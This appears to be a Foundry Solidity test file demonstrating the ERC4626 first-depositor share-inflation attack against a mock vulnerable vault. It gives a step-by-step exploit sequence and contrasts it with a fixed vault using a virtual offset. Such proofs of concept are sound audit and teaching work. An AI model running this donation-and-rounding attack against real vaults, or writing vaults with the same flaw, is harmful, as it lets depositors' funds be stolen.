// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {VulnerableVault, IERC20} from "../src/VulnerableVault.sol";
import {SafeVault} from "../src/SafeVault.sol";

/// PoC for the ERC4626 first-depositor / share-inflation attack.
///   forge test --match-contract InflationAttack -vvv
///
/// Invariant that SHOULD hold (master-checklist Vault/ERC-4626):
///   a depositor must be able to redeem >= what they deposited (minus tiny rounding),
///   and no other actor should profit from their deposit.
/// The attack breaks it: the attacker ends richer, the victim poorer.
contract InflationAttackTest is Test {
    MockERC20 token;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token = new MockERC20();
        token.mint(attacker, 100e18);
        token.mint(victim, 100e18);
    }

    function test_vulnerableVault_isDrained() public {
        VulnerableVault vault = new VulnerableVault(IERC20(address(token)));

        uint256 attackerStart = token.balanceOf(attacker);
        uint256 victimDeposit = 2e18;
        uint256 donation = victimDeposit / 2; // 1e18

        // 1. Attacker seeds the vault with 1 wei -> mints 1 share (supply=1, assets=1).
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        assertEq(vault.balanceOf(attacker), 1, "attacker should hold exactly 1 share");

        // 2. Attacker DONATES assets directly to inflate price-per-share.
        //    With supply=1, assets become (1 + donation); a victim deposit of
        //    victimDeposit then mints floor(victimDeposit / (1+donation)) = 1 share,
        //    so the attacker's single share now commands ~half the enlarged pool.
        token.transfer(address(vault), donation);
        vm.stopPrank();

        // 3. Victim deposits. shares = victimDeposit * 1 / victimDeposit = 1 (rounded down).
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(victimDeposit);
        vm.stopPrank();
        console2.log("victim shares minted:", victimShares);

        // 4. Attacker redeems their 1 share -> grabs half of the now-larger pool.
        vm.prank(attacker);
        vault.redeem(1);

        uint256 attackerEnd = token.balanceOf(attacker);
        uint256 victimMaxOut = vault.convertToAssets(vault.balanceOf(victim));

        console2.log("attacker profit (wei):", attackerEnd - attackerStart);
        console2.log("victim deposited:", victimDeposit);
        console2.log("victim redeemable:", victimMaxOut);

        // The exploit: attacker walks away with MORE than they started with...
        assertGt(attackerEnd, attackerStart, "attack should be profitable");
        // ...and the victim can never get their full deposit back.
        assertLt(victimMaxOut, victimDeposit, "victim should be underwater");
    }

    function test_safeVault_resistsAttack() public {
        SafeVault vault = new SafeVault(IERC20(address(token)));

        uint256 attackerStart = token.balanceOf(attacker);
        uint256 victimDeposit = 2e18;
        uint256 donation = victimDeposit / 2;

        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        token.transfer(address(vault), donation);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(victimDeposit);
        vm.stopPrank();

        uint256 attackerShares = vault.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(attackerShares);

        uint256 attackerEnd = token.balanceOf(attacker);
        uint256 victimMaxOut = vault.convertToAssets(victimShares);

        console2.log("[safe] attacker delta (wei):", int256(attackerEnd) - int256(attackerStart));
        console2.log("[safe] victim redeemable:", victimMaxOut);

        // With the virtual-offset fix the attack is NOT profitable: the attacker
        // cannot end ahead by inflating, and the victim keeps ~all their value.
        assertLe(attackerEnd, attackerStart, "fixed vault: attack must not profit");
    }
}
